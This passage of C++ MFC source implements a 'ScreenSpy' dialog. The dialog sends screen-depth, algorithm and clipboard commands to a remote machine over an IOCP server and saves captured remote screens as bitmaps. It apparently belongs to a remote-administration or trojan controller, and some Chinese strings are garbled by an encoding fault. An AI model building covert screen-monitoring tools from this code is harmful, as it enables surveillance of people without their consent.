			SendResetScreen(1);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_1, MF_BYCOMMAND);
		}
		break;
	case IDM_DEEP_4_GRAY:
		{
			SendResetScreen(3);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_GRAY, MF_BYCOMMAND);
		}
		break;
	case IDM_DEEP_4_COLOR:
		{
			SendResetScreen(4);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_COLOR, MF_BYCOMMAND);
		}
		break;
	case IDM_DEEP_8_GRAY:
		{
			SendResetScreen(7);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_GRAY, MF_BYCOMMAND);
		}
		break;
	case IDM_DEEP_8_COLOR:
		{
			SendResetScreen(8);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
		}
		break;
	case IDM_DEEP_16:
		{
			SendResetScreen(16);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_16, MF_BYCOMMAND);
		}
		break;
	case IDM_DEEP_32:
		{
			SendResetScreen(32);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
		}
		break;
	default:
		break;
	}
	CDialogEx::OnSysCommand(nID, lParam);
}


void CScreenSpyDlg::SendResetScreen(int nBitCount)
{

	m_nBitCount = nBitCount;

	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET;
	bBuff[1] = m_nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}


bool CScreenSpyDlg::SaveSnapshot(void)
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "λͼ�ļ�(*.bmp)|*.bmp|", this);
	if(dlg.DoModal () != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("�ļ�����ʧ��");
		return false;
	}

	// BITMAPINFO��С
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);

	// Fill in the fields of the file header
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();

	return true;

}


void CScreenSpyDlg::SendLocalClipboard(void)
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}


void CScreenSpyDlg::SendResetAlgorithm(UINT nAlgorithm)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_ALGORITHM_RESET;
	bBuff[1] = nAlgorithm;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}




